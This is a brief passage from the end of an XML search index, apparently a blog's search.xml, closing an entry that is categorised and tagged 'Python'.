        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
</search>
